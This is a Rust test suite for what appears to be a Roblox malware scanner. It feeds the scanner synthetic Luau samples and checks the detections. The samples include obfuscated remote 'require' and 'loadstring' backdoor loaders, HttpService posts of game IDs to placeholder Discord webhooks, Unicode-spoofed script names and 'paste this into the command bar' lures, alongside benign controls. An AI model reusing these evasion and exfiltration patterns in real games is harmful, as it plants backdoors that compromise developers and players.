use bloxguard_core::config::Config;
use bloxguard_core::engine;
use bloxguard_core::finding::{Confidence, Severity};
use bloxguard_core::model::Completeness;
use bloxguard_core::report::ScanReport;
use rbx_dom_weak::{InstanceBuilder, WeakDom};
use rbx_types::Attributes;
use std::fs;
use std::path::Path;

fn temp_dir() -> tempfile::TempDir {
    tempfile::Builder::new()
        .prefix("bloxguard_FAKE_review_round1_")
        .tempdir_in(env!("CARGO_MANIFEST_DIR"))
        .expect("create repository-local review fixture directory")
}

fn write(path: impl AsRef<Path>, contents: impl AsRef<[u8]>) {
    fs::write(path, contents).expect("write synthetic review fixture")
}

fn scan_source(case: &str, source: &str, config: &Config) -> ScanReport {
    let temp = temp_dir();
    let path = temp.path().join(format!("{case}_FAKE.luau"));
    write(&path, source);
    engine::scan_paths(&[path], config)
}

fn fixture_dom(nodes: Vec<(Option<usize>, InstanceBuilder)>) -> WeakDom {
    let mut dom = WeakDom::new(InstanceBuilder::new("DataModel"));
    let mut referents = Vec::with_capacity(nodes.len());
    for (parent, builder) in nodes {
        let parent = parent.map_or(dom.root_ref(), |index| referents[index]);
        referents.push(dom.insert(parent, builder));
    }
    dom
}

fn scan_dom(case: &str, dom: &WeakDom, extension: &str, config: &Config) -> ScanReport {
    let temp = temp_dir();
    let path = temp.path().join(format!("{case}_FAKE.{extension}"));
    let mut bytes = Vec::new();
    match extension {
        "rbxm" => rbx_binary::to_writer(&mut bytes, dom, dom.root().children())
            .expect("serialize synthetic binary fixture"),
        "rbxmx" => rbx_xml::to_writer_default(&mut bytes, dom, dom.root().children())
            .expect("serialize synthetic XML fixture"),
        _ => panic!("unsupported synthetic fixture extension: {extension}"),
    }
    write(&path, bytes);
    engine::scan_paths(&[path], config)
}

fn script(name: &str, source: &str) -> InstanceBuilder {
    InstanceBuilder::new("Script")
        .with_name(name)
        .with_property("Source", source)
}

fn named(class: &str, name: &str) -> InstanceBuilder {
    InstanceBuilder::new(class).with_name(name)
}

fn assert_complete(case: &str, report: &ScanReport) {
    assert_eq!(
        report.completeness,
        Completeness::Complete,
        "{case} report was incomplete: {:?}",
        report.inputs
    );
    assert!(
        report
            .inputs
            .iter()
            .all(|input| input.completeness == Completeness::Complete),
        "{case} input was incomplete: {:?}",
        report.inputs
    );
}

fn assert_rule(case: &str, report: &ScanReport, rule: &str) {
    assert!(
        report
            .findings
            .iter()
            .any(|finding| finding.rule_id == rule),
        "{case} expected {rule}, got {:?}",
        report
            .findings
            .iter()
            .map(|finding| (&finding.rule_id, finding.severity, finding.confidence))
            .collect::<Vec<_>>()
    );
}

fn assert_one_of_rules(case: &str, report: &ScanReport, rules: &[&str]) {
    assert!(
        report
            .findings
            .iter()
            .any(|finding| rules.contains(&finding.rule_id.as_str())),
        "{case} expected one of {rules:?}, got {:?}",
        report
            .findings
            .iter()
            .map(|finding| finding.rule_id.as_str())
            .collect::<Vec<_>>()
    );
}

fn assert_critical(case: &str, report: &ScanReport, rule: &str) {
    assert!(
        report
            .findings
            .iter()
            .any(|finding| finding.rule_id == rule && finding.severity == Severity::Critical),
        "{case} expected critical {rule}: {:?}",
        report.findings
    );
}

fn assert_high_confidence(case: &str, report: &ScanReport, rule: &str) {
    assert!(
        report
            .findings
            .iter()
            .any(|finding| finding.rule_id == rule && finding.confidence == Confidence::High),
        "{case} expected high-confidence {rule}: {:?}",
        report.findings
    );
}

fn assert_clean(case: &str, report: &ScanReport) {
    assert_complete(case, report);
    assert!(
        report
            .findings
            .iter()
            .all(|finding| finding.severity < Severity::High),
        "{case} had a high or critical finding: {:?}",
        report.findings
    );
}

fn base64_encode(bytes: &[u8]) -> String {
    const ALPHABET: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut output = String::with_capacity(bytes.len().div_ceil(3) * 4);
    for chunk in bytes.chunks(3) {
        let a = chunk[0];
        let b = chunk.get(1).copied().unwrap_or(0);
        let c = chunk.get(2).copied().unwrap_or(0);
        output.push(ALPHABET[(a >> 2) as usize] as char);
        output.push(ALPHABET[(((a & 0x03) << 4) | (b >> 4)) as usize] as char);
        output.push(if chunk.len() > 1 {
            ALPHABET[(((b & 0x0f) << 2) | (c >> 6)) as usize] as char
        } else {
            '='
        });
        output.push(if chunk.len() > 2 {
            ALPHABET[(c & 0x3f) as usize] as char
        } else {
            '='
        });
    }
    output
}

#[test]
fn review_e01_pcall_require() {
    let report = scan_source(
        "E01",
        "pcall(require, 999000000000201)\n",
        &Config::default(),
    );
    assert_complete("E01", &report);
    assert_rule("E01", &report, "BG001");
}

#[test]
fn review_e02_decimal_escape_key() {
    let report = scan_source(
        "E02",
        r#"_G["\114\101\113\117\105\114\101"](999000000000202)
"#,
        &Config::default(),
    );
    assert_complete("E02", &report);
    assert_rule("E02", &report, "BG001");
    assert_high_confidence("E02", &report, "BG001");
}

#[test]
fn review_e03_method_reverse_key() {
    let report = scan_source(
        "E03",
        "_G[(\"eriuqer\"):reverse()](999000000000203)\n",
        &Config::default(),
    );
    assert_complete("E03", &report);
    assert_rule("E03", &report, "BG001");
    assert_high_confidence("E03", &report, "BG001");
}

#[test]
fn review_e04_func_reverse_key() {
    let report = scan_source(
        "E04",
        "_G[string.reverse(\"eriuqer\")](999000000000204)\n",
        &Config::default(),
    );
    assert_complete("E04", &report);
    assert_rule("E04", &report, "BG001");
}

#[test]
fn review_e05_table_concat_key() {
    let report = scan_source(
        "E05",
        "local k = table.concat({\"re\", \"quire\"})\n_G[k](999000000000205)\n",
        &Config::default(),
    );
    assert_complete("E05", &report);
    assert_rule("E05", &report, "BG001");
    assert_high_confidence("E05", &report, "BG001");
}

#[test]
fn review_e06_getfenv_concat() {
    let report = scan_source(
        "E06",
        "getfenv()[\"re\" .. \"quire\"](999000000000206)\n",
        &Config::default(),
    );
    assert_complete("E06", &report);
    assert_rule("E06", &report, "BG001");
    assert_rule("E06", &report, "BG004");
}

#[test]
fn review_e07_rawget_char() {
    let report = scan_source(
        "E07",
        "rawget(getfenv(0), string.char(114,101,113,117,105,114,101))(999000000000207)\n",
        &Config::default(),
    );
    assert_complete("E07", &report);
    assert_rule("E07", &report, "BG001");
    assert_rule("E07", &report, "BG004");
}

#[test]
fn review_e08_arith_split() {
    let report = scan_source(
        "E08",
        "require(999000000000000 + 208)\n",
        &Config::default(),
    );
    assert_complete("E08", &report);
    assert_rule("E08", &report, "BG001");
}

#[test]
fn review_e09_hex_literal() {
    let report = scan_source("E09", "require(0x38c95d02170d1)\n", &Config::default());
    assert_complete("E09", &report);
    assert_rule("E09", &report, "BG001");
    assert_high_confidence("E09", &report, "BG001");
}

#[test]
fn review_e10_underscore_literal() {
    let report = scan_source("E10", "require(999_000_000_000_210)\n", &Config::default());
    assert_complete("E10", &report);
    assert_rule("E10", &report, "BG001");
    assert_high_confidence("E10", &report, "BG001");
}

#[test]
fn review_e11_tonumber_concat() {
    let report = scan_source(
        "E11",
        "require(tonumber(\"999\" .. \"000000000211\"))\n",
        &Config::default(),
    );
    assert_complete("E11", &report);
    assert_rule("E11", &report, "BG001");
}

#[test]
fn review_e12_tonumber_method_reverse() {
    let report = scan_source(
        "E12",
        "require(tonumber((\"212000000000999\"):reverse()))\n",
        &Config::default(),
    );
    assert_complete("E12", &report);
    assert_rule("E12", &report, "BG001");
    assert_high_confidence("E12", &report, "BG001");
}

#[test]
fn review_e13_table_field_alias() {
    let report = scan_source(
        "E13",
        "local m = {}\nm.load = require\nm.load(999000000000213)\n",
        &Config::default(),
    );
    assert_complete("E13", &report);
    assert_rule("E13", &report, "BG001");
}

#[test]
fn review_e14_global_field_alias() {
    let report = scan_source(
        "E14",
        "_G.FAKE_loader = require\n_G.FAKE_loader(999000000000214)\n",
        &Config::default(),
    );
    assert_complete("E14", &report);
    assert_rule("E14", &report, "BG001");
}

#[test]
fn review_e15_task_spawn_require() {
    let report = scan_source(
        "E15",
        "task.spawn(require, 999000000000215)\n",
        &Config::default(),
    );
    assert_complete("E15", &report);
    assert_rule("E15", &report, "BG001");
}

#[test]
fn review_e16_pcall_loadstring() {
    let report = scan_source(
        "E16",
        "local ok, f = pcall(loadstring, \"return 1\")\nif ok then f() end\n",
        &Config::default(),
    );
    assert_complete("E16", &report);
    assert_rule("E16", &report, "BG003");
}

#[test]
fn review_e17_loadstring_escape() {
    let report = scan_source(
        "E17",
        r#"local f = _G["\108\111\97\100\115\116\114\105\110\103"]("return 1")
f()
"#,
        &Config::default(),
    );
    assert_complete("E17", &report);
    assert_rule("E17", &report, "BG003");
    assert_high_confidence("E17", &report, "BG003");
}

#[test]
fn review_e18_loadstring_method_reverse() {
    let report = scan_source(
        "E18",
        "local f = _G[(\"gnirtsdaol\"):reverse()](\"return 1\")\nf()\n",
        &Config::default(),
    );
    assert_complete("E18", &report);
    assert_rule("E18", &report, "BG003");
    assert_high_confidence("E18", &report, "BG003");
}

#[test]
fn review_e19_webhook_concat_table() {
    let report = scan_source(
        "E19",
        "local H = game:GetService(\"HttpService\")\nH:RequestAsync({Url = \"https://discord.com/api/\" .. \"webhooks/000/FAKE\", Method = \"POST\", Body = \"{}\"})\n",
        &Config::default(),
    );
    assert_complete("E19", &report);
    assert_rule("E19", &report, "BG008");
}

#[test]
fn review_e20_webhook_var_table() {
    let report = scan_source(
        "E20",
        "local H = game:GetService(\"HttpService\")\nlocal url = \"https://discord.com/api/webhooks/000/FAKE\"\nH:RequestAsync({Url = url, Method = \"POST\", Body = \"{}\"})\n",
        &Config::default(),
    );
    assert_complete("E20", &report);
    assert_rule("E20", &report, "BG008");
}

#[test]
fn review_e21_proxy_preencoded() {
    let report = scan_source(
        "E21",
        "local H = game:GetService(\"HttpService\")\nlocal body = H:JSONEncode({place = game.PlaceId, job = game.JobId})\nH:PostAsync(\"https://webhook-proxy.example.test/api/webhooks/000/FAKE\", body)\n",
        &Config::default(),
    );
    assert_complete("E21", &report);
    assert_rule("E21", &report, "BG008");
}

#[test]
fn review_e22_webhook_var_concat_post() {
    let report = scan_source(
        "E22",
        "local H = game:GetService(\"HttpService\")\nlocal u = \"https://disc\" .. \"ord.com/api/webhooks/000/FAKE\"\nH:PostAsync(u, \"{}\")\n",
        &Config::default(),
    );
    assert_complete("E22", &report);
    assert_rule("E22", &report, "BG008");
}

#[test]
fn review_e23_obfuscated_blob_loadstring() {
    let bytes = (0..600)
        .map(|index| (index * 37 + 11) as u8)
        .collect::<Vec<_>>();
    let source = format!(
        "local FAKE_blob = \"{}\"\nlocal run = loadstring\nrun(FAKE_blob)()\n",
        base64_encode(&bytes)
    );
    let report = scan_source("E23", &source, &Config::default());
    assert_complete("E23", &report);
    assert_rule("E23", &report, "BG003");
    assert_rule("E23", &report, "BG005");
}

#[test]
fn review_e24_hex_escapes_short() {
    let report = scan_source(
        "E24",
        "local s = \"\\x46\\x41\\x4b\\x45\\x20\\x70\\x61\\x79\\x6c\\x6f\\x61\\x64\"\nreturn s\n",
        &Config::default(),
    );
    assert_complete("E24", &report);
    assert_rule("E24", &report, "BG005");
}

#[test]
fn review_e25_local_dom_value_above_root() {
    let report = scan_source(
        "E25",
        "require(script.Parent.Parent.FAKE_Config.Value)\n",
        &Config::default(),
    );
    assert_complete("E25", &report);
    assert_one_of_rules("E25", &report, &["BG002", "BG001"]);
}

#[test]
fn review_e26_workspace_value() {
    let report = scan_source(
        "E26",
        "require(workspace.FAKE_Config.Value)\n",
        &Config::default(),
    );
    assert_complete("E26", &report);
    assert_one_of_rules("E26", &report, &["BG001", "BG002"]);
}

#[test]
fn review_e27_numbervalue_two_levels() {
    let nodes = vec![
        (None, named("Model", "FAKE_Model")),
        (Some(0), named("Folder", "FAKE_Cfg")),
        (
            Some(1),
            named("NumberValue", "FAKE_Id").with_property("Value", 999_000_000_000_227_f64),
        ),
        (Some(0), named("Folder", "FAKE_Scripts")),
        (
            Some(3),
            script(
                "FAKE_Loader",
                "require(script.Parent.Parent.FAKE_Cfg.FAKE_Id.Value)",
            ),
        ),
    ];
    let dom = fixture_dom(nodes);
    for extension in ["rbxmx", "rbxm"] {
        let report = scan_dom("E27", &dom, extension, &Config::default());
        assert_complete(&format!("E27 .{extension}"), &report);
        assert_critical(&format!("E27 .{extension}"), &report, "BG002");
        assert_high_confidence(&format!("E27 .{extension}"), &report, "BG002");
    }
}

#[test]
fn review_e28_attribute_on_ancestor() {
    let attributes = Attributes::new().with("FAKE_id", 999_000_000_000_228_f64);
    let nodes = vec![
        (
            None,
            named("Model", "FAKE_Model").with_property("AttributesSerialize", attributes),
        ),
        (Some(0), named("Folder", "FAKE_Scripts")),
        (
            Some(1),
            script(
                "FAKE_Loader",
                "require(script.Parent.Parent:GetAttribute(\"FAKE_id\"))",
            ),
        ),
    ];
    let report = scan_dom("E28", &fixture_dom(nodes), "rbxmx", &Config::default());
    assert_complete("E28", &report);
    assert_critical("E28", &report, "BG002");
    assert_high_confidence("E28", &report, "BG002");
}

#[test]
fn review_e29_stringvalue_tonumber() {
    let nodes = vec![
        (None, named("Model", "FAKE_Model")),
        (
            Some(0),
            named("StringValue", "FAKE_S").with_property("Value", "999000000000229"),
        ),
        (
            Some(0),
            script(
                "FAKE_Loader",
                "require(tonumber(script.Parent.FAKE_S.Value))",
            ),
        ),
    ];
    let report = scan_dom("E29", &fixture_dom(nodes), "rbxmx", &Config::default());
    assert_complete("E29", &report);
    assert_critical("E29", &report, "BG002");
    assert_high_confidence("E29", &report, "BG002");
}

#[test]
fn review_e30_split_two_values() {
    let nodes = vec![
        (None, named("Model", "FAKE_Model")),
        (
            Some(0),
            named("IntValue", "A").with_property("Value", 999_000_000_i64),
        ),
        (
            Some(0),
            named("IntValue", "B").with_property("Value", 230_i64),
        ),
        (
            Some(0),
            script(
                "FAKE_Loader",
                "require(script.Parent.A.Value * 1000000 + script.Parent.B.Value)",
            ),
        ),
    ];
    let report = scan_dom("E30", &fixture_dom(nodes), "rbxmx", &Config::default());
    assert_complete("E30", &report);
    assert_critical("E30", &report, "BG002");
    assert_high_confidence("E30", &report, "BG002");
}

#[test]
fn review_e31_value_above_model_root() {
    let nodes = vec![
        (None, named("Model", "FAKE_Model")),
        (
            Some(0),
            script(
                "FAKE_Loader",
                "require(script.Parent.Parent.FAKE_Config.Value)",
            ),
        ),
    ];
    let report = scan_dom("E31", &fixture_dom(nodes), "rbxmx", &Config::default());
    assert_complete("E31", &report);
    assert_one_of_rules("E31", &report, &["BG001", "BG002"]);
}

#[test]
fn review_e32_findfirstchild_value() {
    let nodes = vec![
        (None, named("Model", "FAKE_Model")),
        (
            Some(0),
            named("NumberValue", "FAKE_Id").with_property("Value", 999_000_000_000_232_f64),
        ),
        (
            Some(0),
            script(
                "FAKE_Loader",
                "local v = script.Parent:WaitForChild(\"FAKE_Id\")\nrequire(v.Value)",
            ),
        ),
    ];
    let report = scan_dom("E32", &fixture_dom(nodes), "rbxmx", &Config::default());
    assert_complete("E32", &report);
    assert_critical("E32", &report, "BG002");
    assert_high_confidence("E32", &report, "BG002");
}

#[test]
fn review_e33_zero_width_name() {
    let nodes = vec![
        (None, named("Model", "FAKE_Model")),
        (Some(0), script("FAKE\u{200b}Loader", "return true")),
    ];
    let report = scan_dom("E33", &fixture_dom(nodes), "rbxmx", &Config::default());
    assert_complete("E33", &report);
    assert_rule("E33", &report, "BG006");
}

#[test]
fn review_e34_cyrillic_service_name() {
    let nodes = vec![
        (None, named("Model", "FAKE_Model")),
        (Some(0), script("ServerScriptServi\u{0441}e", "return true")),
    ];
    let report = scan_dom("E34", &fixture_dom(nodes), "rbxmx", &Config::default());
    assert_complete("E34", &report);
    assert_rule("E34", &report, "BG006");
}

#[test]
fn review_e35_rtl_override_name() {
    let nodes = vec![
        (None, named("Model", "FAKE_Model")),
        (Some(0), script("FAKE\u{202e}tpircS", "return true")),
    ];
    let report = scan_dom("E35", &fixture_dom(nodes), "rbxmx", &Config::default());
    assert_complete("E35", &report);
    assert_rule("E35", &report, "BG006");
}

#[test]
fn review_e36_nested_600() {
    let mut nodes = Vec::with_capacity(602);
    let mut parent = None;
    for index in (0..600).rev() {
        let class = if index % 2 == 0 { "Part" } else { "Model" };
        nodes.push((parent, named(class, &format!("FAKE_N{index}"))));
        parent = Some(nodes.len() - 1);
    }
    nodes.push((parent, script("FAKE_Deep", "require(999000000000236)")));
    let report = scan_dom("E36", &fixture_dom(nodes), "rbxmx", &Config::default());
    assert_complete("E36", &report);
    assert_rule("E36", &report, "BG001");
    assert_rule("E36", &report, "BG006");
}

#[test]
fn review_e37_folder_nested_40() {
    let mut nodes = vec![(None, named("Model", "FAKE_Model"))];
    let mut parent = Some(0);
    for index in (0..40).rev() {
        nodes.push((parent, named("Folder", &format!("FAKE_F{index}"))));
        parent = Some(nodes.len() - 1);
    }
    nodes.push((parent, script("FAKE_DeepFolder", "return true")));
    let report = scan_dom("E37", &fixture_dom(nodes), "rbxmx", &Config::default());
    assert_complete("E37", &report);
    assert_rule("E37", &report, "BG006");
}

#[test]
fn review_e38_comment_social() {
    let nodes = vec![
        (None, named("Model", "FAKE_Model")),
        (
            Some(0),
            script(
                "FAKE_Readme",
                "-- To finish setup paste this into the command bar: require(999000000000238)\nreturn true",
            ),
        ),
    ];
    let report = scan_dom("E38", &fixture_dom(nodes), "rbxmx", &Config::default());
    assert_complete("E38", &report);
    assert_rule("E38", &report, "BG012");
}

#[test]
fn review_e39_stringvalue_social() {
    let nodes = vec![
        (None, named("Model", "FAKE_Model")),
        (
            Some(0),
            named("StringValue", "FAKE_README").with_property(
                "Value",
                "Paste this into the command bar: require(999000000000239)",
            ),
        ),
        (Some(0), script("FAKE_Main", "return true")),
    ];
    let report = scan_dom("E39", &fixture_dom(nodes), "rbxmx", &Config::default());
    assert_complete("E39", &report);
    assert_rule("E39", &report, "BG012");
}

#[test]
fn review_e40_tree_attribute() {
    let temp = temp_dir();
    let root = temp.path().join("E40_tree_attr");
    let tool = root.join("FAKE_Tool");
    fs::create_dir_all(&tool).expect("create E40 source tree");
    write(
        tool.join("init.meta.json"),
        r#"{"className":"Model","attributes":{"FAKE_id":999000000000240}}"#,
    );
    write(
        tool.join("Loader.server.luau"),
        "require(script.Parent:GetAttribute(\"FAKE_id\"))\n",
    );
    let report = engine::scan_paths(&[root], &Config::default());
    assert_complete("E40", &report);
    assert_critical("E40", &report, "BG002");
    assert_high_confidence("E40", &report, "BG002");
}

#[test]
fn review_l01_module_require() {
    let nodes = vec![
        (None, named("Model", "FAKE_Kit")),
        (
            Some(0),
            InstanceBuilder::new("ModuleScript")
                .with_name("Module")
                .with_property("Source", "return {}"),
        ),
        (
            Some(0),
            script(
                "Main",
                "local Module = require(script.Parent.Module)\nreturn Module",
            ),
        ),
    ];
    let report = scan_dom("L01", &fixture_dom(nodes), "rbxmx", &Config::default());
    assert_clean("L01", &report);
}

#[test]
fn review_l02_package_require() {
    let report = scan_source(
        "L02",
        "local ReplicatedStorage = game:GetService(\"ReplicatedStorage\")\nlocal Packages = ReplicatedStorage:WaitForChild(\"Packages\")\nlocal Promise = require(Packages.Promise)\nreturn Promise\n",
        &Config::default(),
    );
    assert_clean("L02", &report);
}

#[test]
fn review_l03_dotted_require() {
    let report = scan_source(
        "L03",
        "local Util = require(game.ReplicatedStorage.Shared.Util)\nreturn Util\n",
        &Config::default(),
    );
    assert_clean("L03", &report);
}

#[test]
fn review_l04_string_require() {
    let report = scan_source(
        "L04",
        "local Signal = require(\"./Signal\")\nreturn Signal\n",
        &Config::default(),
    );
    assert_clean("L04", &report);
}

#[test]
fn review_l05_admin_loader_trusted() {
    let config = Config {
        trusted_asset_ids: vec![999_000_000_000_301],
        ..Config::default()
    };
    let report = scan_source("L05", "require(999000000000301).load()\n", &config);
    assert_clean("L05", &report);
}

#[test]
fn review_l06_analytics_event() {
    let report = scan_source(
        "L06",
        "local HttpService = game:GetService(\"HttpService\")\nlocal ANALYTICS_URL = \"https://analytics.example.test/v1/events\"\nlocal function track(name)\n\tlocal payload = HttpService:JSONEncode({event = name})\n\tHttpService:PostAsync(ANALYTICS_URL, payload)\nend\ntrack(\"round_end\")\n",
        &Config::default(),
    );
    assert_clean("L06", &report);
}

#[test]
fn review_l07_analytics_userid_known_bg008_false_positive() {
    let report = scan_source(
        "L07",
        "local HttpService = game:GetService(\"HttpService\")\ngame:GetService(\"Players\").PlayerAdded:Connect(function(player)\n\tHttpService:PostAsync(\"https://analytics.example.test/v1/join\", HttpService:JSONEncode({user = player.UserId}))\nend)\n",
        &Config::default(),
    );
    assert_complete("L07", &report);
    assert_rule("L07", &report, "BG008");
    assert!(
        report
            .findings
            .iter()
            .filter(|finding| finding.severity >= Severity::High)
            .all(|finding| finding.rule_id == "BG008"),
        "L07 only permits the documented BG008 high false positive: {:?}",
        report.findings
    );
}

#[test]
fn review_l08_studio_debug() {
    let report = scan_source(
        "L08",
        "local RunService = game:GetService(\"RunService\")\nif RunService:IsStudio() then\n\twarn(\"FAKE debug: verbose logging on\")\nend\n",
        &Config::default(),
    );
    assert_clean("L08", &report);
}

#[test]
fn review_l09_minified() {
    let report = scan_source(
        "L09",
        "local a,b,c={},{},0 for i=1,64 do a[i]=i*3%7 end while c<10 do c=c+1 if a[c]==1 then b[1]=c elseif a[c]==2 then b[2]=c elseif a[c]==3 then b[3]=c else b[4]=c end end return {a=a,b=b,n=#a,m=math.max(1,2,3,4,5,6,7,8,9)}\n",
        &Config::default(),
    );
    assert_clean("L09", &report);
}

#[test]
fn review_l10_ancestor_require() {
    let report = scan_source(
        "L10",
        "return require(script:FindFirstAncestor(\"Packages\").Promise)\n",
        &Config::default(),
    );
    assert_clean("L10", &report);
}

#[test]
fn review_l11_lazy_require() {
    let report = scan_source(
        "L11",
        "local function lazy(module)\n\treturn require(module)\nend\nreturn lazy\n",
        &Config::default(),
    );
    assert_clean("L11", &report);
}

#[test]
fn review_l12_round_loop() {
    let report = scan_source(
        "L12",
        "local Players = game:GetService(\"Players\")\nlocal state = {phase = 1, timer = 0}\nlocal phases = {\"Intermission\", \"Round\", \"Results\"}\nwhile true do\n\ttask.wait(1)\n\tstate.timer = state.timer + 1\n\tif state.phase == 1 and state.timer >= 15 then\n\t\tstate.phase = 2\n\t\tstate.timer = 0\n\telseif state.phase == 2 and state.timer >= 120 then\n\t\tstate.phase = 3\n\t\tstate.timer = 0\n\telseif state.phase == 3 and state.timer >= 10 then\n\t\tstate.phase = 1\n\t\tstate.timer = 0\n\tend\n\tlocal label = phases[state.phase]\n\tfor _, p in ipairs(Players:GetPlayers()) do\n\t\tp:SetAttribute(\"Phase\", label)\n\t\tp:SetAttribute(\"Timer\", state.timer)\n\t\tp:SetAttribute(\"Slot\", state.phase * 10 + 5)\n\tend\nend\n",
        &Config::default(),
    );
    assert_clean("L12", &report);
}

#[test]
fn review_l13_tool_shop() {
    let nodes = vec![
        (None, named("Tool", "FAKE_ShopTool")),
        (
            Some(0),
            script(
                "Buy",
                "local MarketplaceService = game:GetService(\"MarketplaceService\")\nscript.Parent.Activated:Connect(function()\n\tlocal player = game:GetService(\"Players\"):GetPlayerFromCharacter(script.Parent.Parent)\n\tMarketplaceService:PromptGamePassPurchase(player, 999000000000313)\nend)",
            ),
        ),
    ];
    let report = scan_dom("L13", &fixture_dom(nodes), "rbxmx", &Config::default());
    assert_clean("L13", &report);
}

#[test]
fn review_l14_findfirstchild_service_require() {
    let report = scan_source(
        "L14",
        "local RS = game:GetService(\"ReplicatedStorage\")\nlocal Mod = require(RS.Modules:FindFirstChild(\"Inventory\"))\nreturn Mod\n",
        &Config::default(),
    );
    assert_clean("L14", &report);
}
